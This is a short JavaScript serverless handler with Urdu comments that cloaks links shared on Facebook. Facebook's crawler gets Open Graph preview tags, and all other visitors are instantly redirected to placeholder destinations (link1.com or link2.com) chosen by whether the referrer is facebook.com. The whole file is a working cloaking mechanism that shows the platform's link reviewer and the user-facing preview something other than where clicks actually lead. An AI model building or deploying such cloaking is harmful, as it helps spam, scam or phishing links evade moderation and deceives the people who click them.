export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const isFacebookBot = /facebookexternalhit|Facebot/i.test(userAgent);
  
  // اگر Facebook کا کرالر ہو تو meta tags والا HTML بھیجیں
  if (isFacebookBot) {
    res.setHeader('Content-Type', 'text/html');
    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <meta property="og:title" content="میرا ٹائٹل" />
          <meta property="og:description" content="میری تفصیل" />
          <meta property="og:image" content="https://${req.headers.host}/image.jpeg" />
          <meta property="og:url" content="https://${req.headers.host}/" />
          <meta property="og:type" content="website" />
        </head>
        <body>
          <!-- خالی باڈی -->
        </body>
      </html>
    `);
  } else {
    // عام یوزرز کو ری ڈائریکٹ کرنے والا HTML بھیجیں
    res.setHeader('Content-Type', 'text/html');
    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <script>
            const referrer = document.referrer.toLowerCase();
            if (referrer.includes('facebook.com')) {
              window.location.href = 'https://link1.com'; // Facebook سے آنے پر یہ لنک
            } else {
              window.location.href = 'https://link2.com'; // ڈائریکٹ آنے پر یہ لنک
            }
          </script>
          <noscript>
            <meta http-equiv="refresh" content="0; url=https://link2.com">
          </noscript>
        </head>
        <body>
          Redirecting...
        </body>
      </html>
    `);
  }
}
